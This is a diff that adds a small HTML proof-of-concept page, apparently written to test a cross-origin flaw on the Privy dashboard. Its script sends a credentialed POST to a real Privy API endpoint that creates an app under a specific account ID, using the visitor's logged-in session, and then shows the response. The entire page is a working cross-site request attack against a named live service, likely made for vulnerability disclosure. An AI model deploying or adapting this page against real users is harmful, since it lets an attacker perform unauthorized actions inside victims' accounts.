@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Privy CORS PoC</title>
+</head>
+<body>
+    <h1>Privy CORS PoC Test</h1>
+    <button id="testBtn">Run CORS Test</button>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById("testBtn").addEventListener("click", async () => {
+            const output = document.getElementById("output");
+            try {
+                const response = await fetch(
+                    "https://dashboard.privy.io/api/v1/accounts/cme71wisc0103jp0ax3nviabk/create_app",
+                    {
+                        method: "POST",
+                        credentials: "include",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            name: "cors-test",
+                            createWebClient: true,
+                            createMobileClient: false
+                        })
+                    }
+                );
+                const text = await response.text();
+                output.textContent = `Response:\n${text}`;
+            } catch (err) {
+                output.textContent = `Error:\n${err}`;
+            }
+        });
+    </script>
+</body>
+</html>
